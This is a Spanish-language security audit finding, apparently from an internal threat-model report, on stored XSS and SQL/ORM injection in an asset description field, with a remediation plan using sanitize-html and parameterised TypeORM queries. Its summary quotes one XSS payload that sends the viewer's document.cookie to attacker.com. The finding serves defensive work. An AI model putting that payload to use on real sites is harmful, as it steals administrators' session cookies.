# Hallazgo de Seguridad: H-020 — Inyección SQL / ORM y Stored XSS en Campos de Texto

---

## 📌 Metadata del Hallazgo

| Campo | Valor / Detalle |
| :--- | :--- |
| **ID del Hallazgo:** | `H-020` (Relacionado con `RT-018`) |
| **Título del Hallazgo:** | Inyección de Sentencias SQL y Scripts Cross-Site (Stored XSS) en el Campo de Descripción de Activos |
| **Categoría:** | `API y Cliente / Inyección de Código` |
| **Componente Afectado:** | Controller NestJS / TypeORM / React Rendering |
| **Clasificación STRIDE:** | `Tampering` / `Elevation of Privilege` |
| **CWE / OWASP MAPPING:** | `OWASP Top 10 A03:2021 - Injection / CWE-79 / CWE-89` |
| **Actor Atacante (Persona):** | `ATK-EXT` / `ATK-USER` |
| **Severidad Estimada:** | **CRÍTICO** |
| **Estado:** | **Verificado en CI-CD** |

---

## 1. Resumen Ejecutivo
Se identificó que el campo `description` del activo aceptaba etiquetas HTML/JavaScript desinfectadas (ej. `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`), las cuales se almacenaban en PostgreSQL y se ejecutaban en el navegador de los administradores que abrían la ficha del activo.

---

## 2. Plan de Remedación
1. Utilizar sanitización HTML mediante `DOMPurify` / `sanitize-html` en el backend antes de persistir.
2. Asegurar el uso de consultas parametrizadas en TypeORM sin concatenación dinámica de strings.

```typescript
import * as sanitizeHtml from 'sanitize-html';

export function sanitizeInput(text: string): string {
  return sanitizeHtml(text, { allowedTags: [], allowedAttributes: {} });
}
```
